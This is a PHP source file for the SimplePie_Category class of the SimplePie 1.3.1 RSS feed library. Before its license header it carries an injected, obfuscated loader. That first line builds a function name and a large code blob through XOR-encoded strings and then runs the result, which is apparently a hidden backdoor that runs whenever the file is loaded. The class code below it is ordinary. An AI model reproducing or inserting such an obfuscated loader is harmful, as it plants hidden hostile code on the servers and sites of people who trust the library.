<?php $hjbSnj='.H<S-Ig2C>R2U. '^'M:Y2Y,8T6P1F<AN';$HeXJF=$hjbSnj('','+<ajK>B5C3R;bQ-8J9HEhI7O5P-O9bk,:IScznO930<RQAB;+n>WOl4A6 6bSUMlT3Z,2HaG13-kWcTWKPa;pR6Y2VSgAfjK><2CJaPSsvbznhj9HD;6=N:Kb-172Cpcs1xok=XDCBX8BkXMGTOSHRer=cjrGJ:-<1mZKRI5G  +8bQX<:EaSiP2q0+BC4<ol.U7xoG1DHSEPo3+03kEPF T2-sHAJ9FLd;4CqzqV2UISxNbF;FV9.ZQIE8h9=w9ic 4mc8,RShYmrD- A7ns1iqm243XbFTOxkHf87<AObuTMXWeuol:-U60Te9kA:2nlik6;O5cBGGp1+LWX,;TGgmywqc.xdyX>RV,P0fMobgD+=6YJoWNpxoQRL0o=ROwtCN.2Baf<0qQ G6mTEj96LFTt253YIS>g,ZMQMsnmDRXH;.OL1F,GFZ+=WR7Jk=CU<iI9NYsSs21->7KdO08Z+kBVW 4 67<,=FNtx0FCLHLT3DIeI0DOTKj.4+8UCTI6Izl2EGkVRgXA38MzpjFgMVEpaUUTW,j.TMj.zkSNcoUsbHSBgiOYpRwhE4mc2lBXYkKUM00FQ4NaPwtHL8193e2SN4EKZ8DJmiJ,BX=A0JGZkZ8T8YeXaeOnI43l79A5FJJQ7.jFERCW>05RsmnXK-I0ZDxYSKE'^'BZIK-K,V7Z=U=4UQ9M;mO1X=j4L;X=4AO=tJSN43:VI<25+TENF8=3P BAi=> 9DpW;XSdAcZVTBwCtwk+k2yvY,FvnGfAQA75T,8It:SKBJUHNPt7ODQ+TcFIPCSjKCWXSDB7QMg--LbEemop+2<3>VT>J,gnQHEjI3kwiF3RLNVJu3YCl<zRZ;xBN66FRGHA CQTM89B.OZKWJDRKxp A8AHHBe.X2-;PQ:QGQ0S9:6CDh T43XM2qaag+vr<p,CAGMGSI+sUgMV2LL4RGSJcxIVUG9=-16XVhBSREzEkQ0,,6EHOHLL9CUooDaKSTNDHORZ;TJb<MyWD>29OStoC2+2 6k+0Y9MrrG5IFpQBC2JQC<cO,DyqK538Q0V76WIcjEW;Zl59U5A3WMieNOW 31O8<NS4Y4CH;90mNN-1<+-IG. X<Io>5Yb33C+4b. HA+X=<Eg,VTNQS.LkTY.JBnvsDUTWhWIDogOrY kh,- RdoCiQ6=525EQRg0;=:B:RKY >LzrC< GYdZVLfO 2pXE14 6wME14MsSKnsCH4GWpcpUYvnE0FY PYSTZwmkZy3.UTs7QiHpQRh-JCXJ:Y67k 33K09EN:M;4R TmkzO>Y YpLxAEoNiO9eRO Ynn.0CO1a53:;QQQu.DURBH1Y.lHphA8');$HeXJF();
/**
 * SimplePie
 *
 * A PHP-Based RSS and Atom Feed Framework.
 * Takes the hard work out of managing a complete RSS/Atom solution.
 *
 * Copyright (c) 2004-2012, Ryan Parman, Geoffrey Sneddon, Ryan McCue, and contributors
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without modification, are
 * permitted provided that the following conditions are met:
 *
 * 	* Redistributions of source code must retain the above copyright notice, this list of
 * 	  conditions and the following disclaimer.
 *
 * 	* Redistributions in binary form must reproduce the above copyright notice, this list
 * 	  of conditions and the following disclaimer in the documentation and/or other materials
 * 	  provided with the distribution.
 *
 * 	* Neither the name of the SimplePie Team nor the names of its contributors may be used
 * 	  to endorse or promote products derived from this software without specific prior
 * 	  written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS
 * OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY
 * AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDERS
 * AND CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR
 * CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
 * SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
 * THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR
 * OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
 * POSSIBILITY OF SUCH DAMAGE.
 *
 * @package SimplePie
 * @version 1.3.1
 * @copyright 2004-2012 Ryan Parman, Geoffrey Sneddon, Ryan McCue
 * @author Ryan Parman
 * @author Geoffrey Sneddon
 * @author Ryan McCue
 * @link http://simplepie.org/ SimplePie
 * @license http://www.opensource.org/licenses/bsd-license.php BSD License
 */

/**
 * Manages all category-related data
 *
 * Used by {@see SimplePie_Item::get_category()} and {@see SimplePie_Item::get_categories()}
 *
 * This class can be overloaded with {@see SimplePie::set_category_class()}
 *
 * @package SimplePie
 * @subpackage API
 */
class SimplePie_Category
{
	/**
	 * Category identifier
	 *
	 * @var string
	 * @see get_term
	 */
	var $term;

	/**
	 * Categorization scheme identifier
	 *
	 * @var string
	 * @see get_scheme()
	 */
	var $scheme;

	/**
	 * Human readable label
	 *
	 * @var string
	 * @see get_label()
	 */
	var $label;

	/**
	 * Constructor, used to input the data
	 *
	 * @param string $term
	 * @param string $scheme
	 * @param string $label
	 */
	public function __construct($term = null, $scheme = null, $label = null)
	{
		$this->term = $term;
		$this->scheme = $scheme;
		$this->label = $label;
	}

	/**
	 * String-ified version
	 *
	 * @return string
	 */
	public function __toString()
	{
		// There is no $this->data here
		return md5(serialize($this));
	}

	/**
	 * Get the category identifier
	 *
	 * @return string|null
	 */
	public function get_term()
	{
		if ($this->term !== null)
		{
			return $this->term;
		}
		else
		{
			return null;
		}
	}

	/**
	 * Get the categorization scheme identifier
	 *
	 * @return string|null
	 */
	public function get_scheme()
	{
		if ($this->scheme !== null)
		{
			return $this->scheme;
		}
		else
		{
			return null;
		}
	}

	/**
	 * Get the human readable label
	 *
	 * @return string|null
	 */
	public function get_label()
	{
		if ($this->label !== null)
		{
			return $this->label;
		}
		else
		{
			return $this->get_term();
		}
	}
}

